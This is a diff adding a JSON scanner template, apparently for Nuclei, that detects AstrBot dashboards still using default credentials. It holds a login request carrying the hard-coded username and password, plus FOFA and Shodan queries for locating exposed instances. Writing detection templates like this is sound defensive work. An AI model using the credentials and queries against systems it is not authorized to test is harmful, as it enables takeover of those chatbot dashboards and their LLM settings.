@@ -1,0 +1,85 @@
+{
+	"id": "astrbot-default-login",
+	"info": {
+		"name": "AstrBot - Default Login",
+		"author": "theamanrawat",
+		"tags": "astrbot, default-login",
+		"description": "AstrBot contains a default login vulnerability. An attacker can access the AstrBot dashboard using default credentials and gain control over the chatbot framework, modify configurations, manage LLM providers, and execute unauthorized operations.\n",
+		"reference": [
+			"https://github.com/Soulter/AstrBot"
+		],
+		"severity": "high",
+		"metadata": {
+			"fofa-query": "body=\"<title>AstrBot\"",
+			"max-request": 2,
+			"product": "astrbot",
+			"shodan-query": "html:\"<title>AstrBot\"",
+			"vendor": "soulter",
+			"verified": true
+		},
+		"classification": {
+			"cwe-id": [
+				"CWE-798"
+			],
+			"cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L",
+			"cvss-score": 8.3
+		}
+	},
+	"flow": "http(1) && http(2)",
+	"http": [
+		{
+			"matchers": [
+				{
+					"type": "word",
+					"part": "body",
+					"words": [
+						"<title>AstrBot"
+					],
+					"internal": true
+				},
+				{
+					"type": "status",
+					"status": [
+						200
+					],
+					"internal": true
+				}
+			],
+			"matchers-condition": "and",
+			"path": [
+				"{{BaseURL}}/"
+			],
+			"method": "GET"
+		},
+		{
+			"matchers": [
+				{
+					"type": "word",
+					"part": "body",
+					"words": [
+						"\"token\""
+					]
+				},
+				{
+					"type": "status",
+					"status": [
+						200
+					]
+				}
+			],
+			"matchers-condition": "and",
+			"raw": [
+				"POST /api/auth/login HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"username\":\"{{username}}\",\"password\":\"{{password}}\"}\n"
+			],
+			"attack": "pitchfork",
+			"payloads": {
+				"password": [
+					"77b90590a8945a7d36c963981a307dc9"
+				],
+				"username": [
+					"astrbot"
+				]
+			}
+		}
+	]
+}
